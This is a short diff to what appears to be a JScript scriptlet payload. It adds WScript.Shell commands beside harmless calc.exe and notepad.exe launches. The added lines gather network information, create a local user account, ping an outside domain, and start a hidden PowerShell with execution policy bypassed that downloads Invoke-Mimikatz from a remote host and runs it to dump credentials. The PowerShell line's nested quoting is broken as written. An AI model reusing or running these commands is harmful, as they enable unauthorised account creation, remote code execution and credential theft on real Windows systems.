@@ -6,6 +6,10 @@
 <script language="JScript">
 <![CDATA[
 var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); 
+var r = new ActiveXObject("WScript.Shell").Run("Ifconfig /all"); 
+var r = new ActiveXObject("WScript.Shell").Run("net user /add shigeru123"); 
+var r = new ActiveXObject("WScript.Shell").Run("ping nato-press.com"); 
+var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -windowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds""); 
 var r = new ActiveXObject("WScript.Shell").Run("notepad.exe"); 
 ]]>
 </script>
